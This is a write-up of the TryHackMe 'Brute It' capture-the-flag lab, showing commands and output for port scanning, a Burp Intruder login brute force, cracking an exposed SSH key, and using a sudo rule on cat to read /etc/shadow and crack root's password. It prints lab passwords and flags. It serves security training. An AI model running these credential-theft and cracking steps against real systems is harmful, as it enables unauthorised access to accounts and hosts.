<p>Lab: <a href="https://tryhackme.com/room/bruteit">Brute It</a></p>
<p>Tools: </p>
<ul>
<li><strong>nmap</strong>:  tool to find open ports, detect operating systems and discover potential vulnerabilities </li>
<li><strong>gowitness</strong>: command line tool written in Go to capture and screenshot web pages</li>
<li><strong>ffuf</strong>: web fuzzer written in Go to discover hidden or unlinked resources on a web server </li>
<li><strong>metasploit</strong>:framework for developing, testing, and executing exploits on target systems.</li>
<li><strong>ssh2john</strong>: used for extracting password hashes from the OpenSSH private key files.</li>
<li><strong>john the ripper</strong>: password cracking software</li>
<li><strong>burp suite pro:</strong> web application security testing platform</li>
<li><strong>foxy proxy:</strong> browser extension that allows users to easily switch between different proxy configurations</li>
</ul>

<p>After connecting to the network through TryHackMe&#39;s VPN. I want to make sure the target is reachable.</p>
<pre><code>└─<span class="hljs-comment"># ping -c 5 10.10.58.60   </span>
PING <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span> (<span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> data.
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">192</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>: icmp_seq=<span class="hljs-number">2</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">191</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>: icmp_seq=<span class="hljs-number">3</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">189</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>: icmp_seq=<span class="hljs-number">4</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">188</span> ms
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>: icmp_seq=<span class="hljs-number">5</span> ttl=<span class="hljs-number">61</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">189</span> ms

<span class="hljs-comment">--- 10.10.58.60 ping statistics ---</span>
<span class="hljs-number">5</span> packets transmitted, <span class="hljs-number">5</span> received, <span class="hljs-number">0</span>% packet loss, <span class="hljs-built_in">time</span> <span class="hljs-number">4007</span>ms
rtt <span class="hljs-built_in">min</span>/<span class="hljs-built_in">avg</span>/<span class="hljs-built_in">max</span>/mdev = <span class="hljs-number">188.213</span>/<span class="hljs-number">189.910</span>/<span class="hljs-number">192.094</span>/<span class="hljs-number">1.490</span> ms
</code></pre><p><strong>Host Enumeration</strong></p>
<p>After confirming that  I can reach the target, I run an nmap scan.</p>
<table>
<thead>
<tr>
<th>Nmap Flags</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>T5</td>
<td>Fastest scanning speed</td>
</tr>
<tr>
<td>SC</td>
<td>Runs default scripts</td>
</tr>
<tr>
<td>sV</td>
<td>Version detection on open ports</td>
</tr>
</tbody>
</table>
<pre><code>nmap -T5 -sC -sV <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>    
Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org ) at 2024-01-28 18:26 EST</span>
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.58</span><span class="hljs-number">.60</span>
Host is up (<span class="hljs-number">0.19</span>s latency).
Not <span class="hljs-string">shown:</span> <span class="hljs-number">998</span> closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
| ssh-<span class="hljs-string">hostkey:</span> 
|   <span class="hljs-number">2048</span> <span class="hljs-number">4</span><span class="hljs-string">b:</span><span class="hljs-number">0</span><span class="hljs-string">e:</span><span class="hljs-string">bf:</span><span class="hljs-number">14</span>:<span class="hljs-string">fa:</span><span class="hljs-number">54</span>:<span class="hljs-string">b3:</span><span class="hljs-number">5</span><span class="hljs-string">c:</span><span class="hljs-number">44</span>:<span class="hljs-number">15</span>:<span class="hljs-string">ed:</span><span class="hljs-string">b2:</span><span class="hljs-number">5</span><span class="hljs-string">d:</span><span class="hljs-string">a0:</span><span class="hljs-string">ac:</span><span class="hljs-number">8</span>f (RSA)
|   <span class="hljs-number">256</span> <span class="hljs-string">d0:</span><span class="hljs-number">3</span><span class="hljs-string">a:</span><span class="hljs-number">81</span>:<span class="hljs-number">55</span>:<span class="hljs-number">13</span>:<span class="hljs-number">5</span><span class="hljs-string">e:</span><span class="hljs-number">87</span>:<span class="hljs-number">0</span><span class="hljs-string">c:</span><span class="hljs-string">e8:</span><span class="hljs-number">52</span>:<span class="hljs-number">1</span><span class="hljs-string">e:</span><span class="hljs-string">cf:</span><span class="hljs-number">44</span>:<span class="hljs-string">e0:</span><span class="hljs-number">3</span><span class="hljs-string">a:</span><span class="hljs-number">54</span> (ECDSA)
|_  <span class="hljs-number">256</span> <span class="hljs-string">da:</span><span class="hljs-string">ce:</span><span class="hljs-number">79</span>:<span class="hljs-string">e0:</span><span class="hljs-number">45</span>:<span class="hljs-string">eb:</span><span class="hljs-number">17</span>:<span class="hljs-number">25</span>:<span class="hljs-string">ef:</span><span class="hljs-number">62</span>:<span class="hljs-string">ac:</span><span class="hljs-number">98</span>:<span class="hljs-string">f0:</span><span class="hljs-string">cf:</span><span class="hljs-string">bb:</span><span class="hljs-number">04</span> (ED25519)
<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.29</span> ((Ubuntu))
|_http-<span class="hljs-string">title:</span> Apache2 Ubuntu Default <span class="hljs-string">Page:</span> It works
|_http-server-<span class="hljs-string">header:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu)
Service <span class="hljs-string">Info:</span> <span class="hljs-string">OS:</span> Linux; <span class="hljs-string">CPE:</span> <span class="hljs-string">cpe:</span>/<span class="hljs-string">o:</span><span class="hljs-string">linux:</span>linux_kernel

Service detection performed. Please report any incorrect results at <span class="hljs-string">https:</span><span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap <span class="hljs-string">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">18.23</span> seconds
</code></pre><p><strong>Directory Enumeration (Port 80)</strong></p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/bd0d49f3-46ae-4cd6-8c6c-5a95f2f0d19c" alt="http-10 10 58 60-"></p>
<p>Enumerating the website hosted on port 80 reveals a login portal located at  [http]://10.10.58.60/admin/</p>
<pre><code>ffuf -w directory-list-2.3-medium.txt:FUZZ -u http://10.10.58.60/FUZZ

        /'___<span class="hljs-symbol">\ </span> /'___<span class="hljs-symbol">\ </span>          /'___<span class="hljs-symbol">\ </span>      
       /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/ /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/  __  __  /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/       
       <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\ </span>     
        <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/ <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/      
         <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>___/  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>      
          <span class="hljs-symbol">\/</span>_/    <span class="hljs-symbol">\/</span>_/   <span class="hljs-symbol">\/</span>___/    <span class="hljs-symbol">\/</span>_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.58.60/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 187ms]
</code></pre><p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/ecd4c617-a6ec-4d77-ac6f-5b206f849276" alt="http-10 10 58 60-admin-"></p>
<p>Either [CTRL + U] or Right clicking on the admin portal page and then clicking View Page Source will take us to the folliwing URL, view-source:[http]://10.10.58.60/admin/ and reveal a comment stating that the username is &quot;admin&quot;</p>
<pre><code><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"styles.css"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Admin Login Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">""</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>LOGIN<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>


            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Username or password invalid<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>


            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>USERNAME<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user"</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>PASSWORD<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pass"</span>&gt;</span>

            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>LOGIN<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Hey john, if you do not remember, the username is admin --&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre><p>Configure FoxyProxy to tunnel browser traffic through port 8080, which is the same port used by Burp Suite. Then, enable the intercept feature in Burp Proxy. Finally, log in using &#39;admin&#39; as the username and any random word as the password.</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/cd7d0eb3-e052-4a32-8789-d179e7a84801" alt="Pasted image 20240128184355">
<img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/765be4f1-27af-4090-826c-c7435d50db3d" alt="Pasted image 20240128184548"></p>
<p>Send Response to Burp Intruder
Highlight password and then click on &quot;Add&quot;.</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/f137b188-e976-4d48-82e7-c570fffcd09c" alt="Pasted image 20240128184826"></p>
<p>Click on &#39;Payloads,&#39; then select &#39;Add from List&#39; and choose &#39;passwords.&#39; Turn off &#39;URL-encode these characters&#39; under Payload encoding. Finally, click on &#39;Start Attack&quot;.</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/c2659316-8d4a-49c4-982f-53f1f5314dec" alt="Pasted image 20240128185019">
<img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/9310b26c-5e5e-4430-af5b-aaf5cb12bee7" alt="Pasted image 20240128185115"></p>
<p>Sorting by status code shows one payload has an HTTP response code of 302</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/cefd0faa-7c0f-4fd1-ba9b-fadd75e4f7e6" alt="Pasted image 20240128185530"></p>
<p>Another way to find the correct payload  is to use  &quot;Filter: Showing all items&quot;. Each failed login has the following  in its response: <code>&lt;p&gt;Username or password invalid&lt;/p&gt;</code>. By clicking on negative search and using that statement it will remove all response that are using invalid credentials</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/19ba437e-f595-495a-9d60-488a01f506cd" alt="Pasted image 20240128185802">
<img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/14d35e49-848d-41c4-8e20-580f4e4d0932" alt="Pasted image 20240128185847"></p>
<p>Logging in with the correct  credentials redirects the admin user to [http]://10.10.58.60/admin/panel/</p>
<p><code>credentials: admin:xavier</code></p>
<p>Clicking on RSA Private Key link redirects the user to [http]://10.10.58.60/admin/panel/id_rsa
Right click on page then click save as to download the private key</p>
<p><img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/9b6e5186-f2c5-4d34-ae7d-937744415b2b" alt="Pasted image 20240128190213">
<img src="https://github.com/paRaade/CTF-Writeups/assets/126734769/61d744ca-d760-4827-9664-4b284edfb8cf" alt="Pasted image 20240128190558"></p>
<p>To convert the private key to a format that john the ripper can crack use the following command</p>
<pre><code><span class="hljs-selector-tag">ssh2john</span> <span class="hljs-selector-tag">id_rsa</span> _<span class="hljs-selector-tag">rsa</span> &gt; <span class="hljs-selector-tag">id_rsa</span><span class="hljs-selector-class">.hash</span>
</code></pre><p>To crack the hash run the following command</p>
<pre><code>john <span class="hljs-comment">--wordlist=rockyou.txt id_rsa.hash                  </span>
Using <span class="hljs-keyword">default</span> input encoding: UTF-<span class="hljs-number">8</span>
Loaded <span class="hljs-number">1</span> password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])
Cost <span class="hljs-number">1</span> (KDF/cipher [<span class="hljs-number">0</span>=MD5/AES <span class="hljs-number">1</span>=MD5/<span class="hljs-number">3</span>DES <span class="hljs-number">2</span>=Bcrypt/AES]) <span class="hljs-keyword">is</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes
Cost <span class="hljs-number">2</span> (iteration count) <span class="hljs-keyword">is</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes
Will run <span class="hljs-number">2</span> OpenMP threads
Press <span class="hljs-symbol">'q</span>' <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> abort, almost any other key <span class="hljs-keyword">for</span> status

rockinroll       (id_rsa)     

<span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2024</span>-<span class="hljs-number">01</span>-<span class="hljs-number">28</span> <span class="hljs-number">19</span>:<span class="hljs-number">10</span>) <span class="hljs-number">1.204</span>g/s <span class="hljs-number">87479</span>p/s <span class="hljs-number">87479</span>c/s <span class="hljs-number">87479</span>C/s rubicon..rock14
<span class="hljs-keyword">Use</span> the <span class="hljs-string">"--show"</span> option <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably
Session completed.
</code></pre><p>Change the permissions of the private key with the following command</p>
<pre><code>chmod <span class="hljs-number">600</span> id_rsa
</code></pre><p><strong>SSH (Port 22)</strong></p>
<p>Login to the target machine</p>
<pre><code>ssh -i id_rsa john@<span class="hljs-number">10.10</span>.<span class="hljs-number">58.60</span>
The authenticity <span class="hljs-keyword">of</span> host '<span class="hljs-number">10.10</span>.<span class="hljs-number">58.60</span> (<span class="hljs-number">10.10</span>.<span class="hljs-number">58.60</span>)' can<span class="hljs-symbol">'t</span> be established.
ED25519 key fingerprint <span class="hljs-keyword">is</span> SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/<span class="hljs-number">7</span>yfrGnM.
This key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> known by any other names.
Are you sure you want <span class="hljs-keyword">to</span> continue connecting (yes/no/[fingerprint])? yes
<span class="hljs-literal">Warning</span>: Permanently added '<span class="hljs-number">10.10</span>.<span class="hljs-number">58.60</span>' (ED25519) <span class="hljs-keyword">to</span> the list <span class="hljs-keyword">of</span> known hosts.
Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-symbol">'id_rsa</span>': 
Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">18.04</span>.<span class="hljs-number">4</span> LTS (GNU/Linux <span class="hljs-number">4.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">118</span>-<span class="hljs-keyword">generic</span> x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as <span class="hljs-keyword">of</span> Mon Jan <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">15</span>:<span class="hljs-number">31</span> UTC <span class="hljs-number">2024</span>

  System load:  <span class="hljs-number">0.0</span>                Processes:           <span class="hljs-number">105</span>
  Usage <span class="hljs-keyword">of</span> /:   <span class="hljs-number">25.7</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">19.56</span>GB   Users logged <span class="hljs-keyword">in</span>:     <span class="hljs-number">0</span>
  Memory usage: <span class="hljs-number">21</span>%                IP address <span class="hljs-keyword">for</span> eth0: <span class="hljs-number">10.10</span>.<span class="hljs-number">58.60</span>
  Swap usage:   <span class="hljs-number">0</span>%


<span class="hljs-number">63</span> packages can be updated.
<span class="hljs-number">0</span> updates are security updates.


Last login: Mon Jan <span class="hljs-number">29</span> <span class="hljs-number">00</span>:<span class="hljs-number">14</span>:<span class="hljs-number">47</span> <span class="hljs-number">2024</span> from <span class="hljs-number">10.13</span>.<span class="hljs-number">0.39</span>
</code></pre><pre><code>john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt 
THM{a_password_is_not_a_barrier}
</code></pre><p><strong>Privilege Escalation</strong></p>
<p>This command shows what sudo privileges john has</p>
<pre><code>john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l
Matching Defaults entries <span class="hljs-keyword">for</span> john on <span class="hljs-symbol">bruteit:</span>
    env_reset, mail_badpass, secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User john may run the following commands on <span class="hljs-symbol">bruteit:</span>
    (root) <span class="hljs-symbol">NOPASSWD:</span> /bin/cat
</code></pre><p>Searching <a href="https://gtfobins.github.io/gtfobins/cat/#sudo">gtfobins</a> I find the following commands that allow me to set the root.txt flag (which is usually in the root directory) to a variable and then use cat to read the file</p>
<pre><code>john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>LFILE=<span class="hljs-regexp">/root/root</span>.txt
john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo /bin/cat <span class="hljs-string">"$LFILE"</span>
THM{pr1v1l3g3_3sc4l4t10n}
</code></pre><p><strong>Login as root user</strong></p>
<p>With sudo privileges I can read the /etc/shadow file which is inaccesible to regular users</p>
<pre><code>john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo /bin/cat /etc/passwd | head -n <span class="hljs-number">1</span>
<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo /bin/cat /etc/shadow | head -n <span class="hljs-number">1</span>
<span class="hljs-symbol">root:</span><span class="hljs-variable">$6</span><span class="hljs-variable">$zdk0</span>.jUm<span class="hljs-variable">$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg</span>/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.<span class="hljs-symbol">:</span><span class="hljs-number">18490</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">99999</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>
</code></pre><p>Saving the files into two different text files and then running the following commands allows me to crack the weak password of the root user</p>
<pre><code>unshadow passwd.txt shadow.txt &gt; unshadowed.txt

john --wordlist=rockyou.txt unshadowed.txt               
Using default input <span class="hljs-symbol">encoding:</span> UTF-<span class="hljs-number">8</span>
Loaded <span class="hljs-number">1</span> password hash (sha512crypt, crypt(<span class="hljs-number">3</span>) <span class="hljs-variable">$6</span><span class="hljs-variable">$ </span>[SHA512 <span class="hljs-number">128</span>/<span class="hljs-number">128</span> SSE2 <span class="hljs-number">2</span>x])
Cost <span class="hljs-number">1</span> (iteration count) is <span class="hljs-number">5000</span> <span class="hljs-keyword">for</span> all loaded hashes
Will run <span class="hljs-number">2</span> OpenMP threads
Press <span class="hljs-string">'q'</span> <span class="hljs-keyword">or</span> Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status

football         (root)     

<span class="hljs-number">1</span>g <span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span><span class="hljs-number">01</span> DONE (<span class="hljs-number">2024</span>-<span class="hljs-number">01</span>-<span class="hljs-number">28</span> <span class="hljs-number">19</span><span class="hljs-symbol">:</span><span class="hljs-number">43</span>) <span class="hljs-number">0</span>.<span class="hljs-number">9345</span>g/s <span class="hljs-number">119.6</span>p/s <span class="hljs-number">119.6</span>c/s <span class="hljs-number">119.6</span>C/s <span class="hljs-number">123456</span>..diamond
Use the <span class="hljs-string">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 


john<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su root
<span class="hljs-symbol">Password:</span> 
root<span class="hljs-variable">@bruteit</span><span class="hljs-symbol">:/home/john</span><span class="hljs-comment"># whoami</span>
root
</code></pre>
